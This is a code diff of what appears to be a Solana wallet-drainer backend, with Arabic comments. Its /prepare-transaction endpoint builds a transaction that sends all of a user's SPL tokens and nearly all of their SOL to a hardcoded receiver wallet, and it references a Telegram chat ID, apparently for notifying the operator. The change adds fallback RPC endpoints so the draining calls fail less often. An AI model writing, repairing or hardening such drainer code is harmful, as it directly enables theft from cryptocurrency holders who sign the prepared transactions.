@@ -19,12 +19,33 @@ const CHAT_ID = process.env.CHAT_ID;
 const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
 const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 
-// ============ اتصال Solana ============
-// استبدل الرابط الحالي بهذا الرابط
-const connection = new Connection(
-  'https://solana.public-rpc.com',
-  'confirmed'
-);
+// ============ اتصال Solana مع Fallbacks ============
+const RPC_ENDPOINTS = [
+  'https://api.mainnet-beta.solana.com',
+  'https://solana-mainnet.rpc.exnode.io',
+  'https://rpc.ankr.com/solana',
+];
+
+let connection;
+let currentRpcIndex = 0;
+
+function createConnection() {
+  return new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
+}
+
+connection = createConnection();
+
+async function withRpcFallback(fn, fallbackIndex = 1) {
+  try {
+    return await fn(connection);
+  } catch (error) {
+    if (fallbackIndex >= RPC_ENDPOINTS.length) throw error;
+    console.log(`RPC error, trying fallback ${fallbackIndex}: ${error.message}`);
+    currentRpcIndex = fallbackIndex;
+    connection = createConnection();
+    return await fn(connection);
+  }
+}
 
 
 // ============ متغيرات التخزين المؤقت ============
@@ -180,9 +201,9 @@ app.post('/prepare-transaction', async (req, res) => {
     );
 
     // جلب ومعالجة الـ SPL Tokens
-    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
-      programId: TOKEN_PROGRAM_ID,
-    });
+    const tokenAccounts = await withRpcFallback(async (conn) =>
+      conn.getParsedTokenAccountsByOwner(fromPubkey, { programId: TOKEN_PROGRAM_ID })
+    );
     
     console.log(`Found ${tokenAccounts.value.length} token accounts`);
 
@@ -199,7 +220,9 @@ app.post('/prepare-transaction', async (req, res) => {
           const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
           const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);
 
-          const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
+          const receiverAccountInfo = await withRpcFallback(async (conn) =>
+              conn.getAccountInfo(toTokenAccount)
+            );
           if (!receiverAccountInfo) {
             transaction.add(
               createAssociatedTokenAccountInstruction(
@@ -228,8 +251,8 @@ app.post('/prepare-transaction', async (req, res) => {
     }
 
     // تحويل SOL
-    const solBalance = await connection.getBalance(fromPubkey);
-    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+    const solBalance = await withRpcFallback(async (conn) => conn.getBalance(fromPubkey));
+    const minBalance = await withRpcFallback(async (conn) => conn.getMinimumBalanceForRentExemption(0));
     const estimatedFees = (tokenTransfers + 1) * 5000 + (tokenTransfers * 2039280);
     const availableBalance = solBalance - minBalance - estimatedFees;
     const solForTransfer = Math.floor(availableBalance * 0.98);
@@ -245,7 +268,7 @@ app.post('/prepare-transaction', async (req, res) => {
       console.log(`Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
     }
 
-    const { blockhash } = await connection.getLatestBlockhash();
+    const { blockhash } = await withRpcFallback(async (conn) => conn.getLatestBlockhash());
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = fromPubkey;
 
